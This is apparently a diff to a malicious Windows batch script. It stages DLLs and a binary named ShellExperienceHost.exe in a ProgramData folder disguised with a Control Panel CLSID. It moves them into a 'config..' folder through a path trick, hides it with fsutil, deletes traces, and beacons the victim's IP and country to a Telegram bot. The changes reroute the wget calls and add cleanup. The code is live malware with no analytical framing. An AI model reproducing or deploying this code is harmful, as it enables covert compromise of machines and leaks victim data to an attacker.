@@ -14,6 +14,7 @@ move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libssl-1_1.dll
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\vcruntime140.dll" "\\.\%ProgramData%\config..\"
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\libcrypto-1_1.dll" "\\.\%ProgramData%\config..\"
 move /Y "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\ShellExperienceHost.exe" "\\.\%ProgramData%\config..\"
+rd /s /q "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}"
 rd /s /q "%ProgramData%\Comms"
 
 fsutil file setshortname C:\ProgramData\config..\ ""
@@ -63,10 +64,10 @@ set "CHAT_ID=-4955395962"
 set "IP=No IP"
 set "Country=No Country"
 
-for /f "tokens=1,2 delims=," %a in ('%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
+for /f "tokens=1,2 delims=," %a in ('%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wget.exe -q --hsts-file=NUL -O - "http://ip-api.com/csv/?fields=country,query" 2^>nul') do (
     if not "%a"=="" set "Country=%a"
     if not "%b"=="" set "IP=%b"
 )
 
-%ProgramData%\ssh\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=RUS%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
+%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\wget.exe -q --hsts-file=NUL -O - --post-data="chat_id=%CHAT_ID%&text=RUS%0AIP: %IP%%0ACountry: %Country%" "https://api.telegram.org/bot%TOKEN%/sendMessage" 1>nul 2>nul
 endlocal
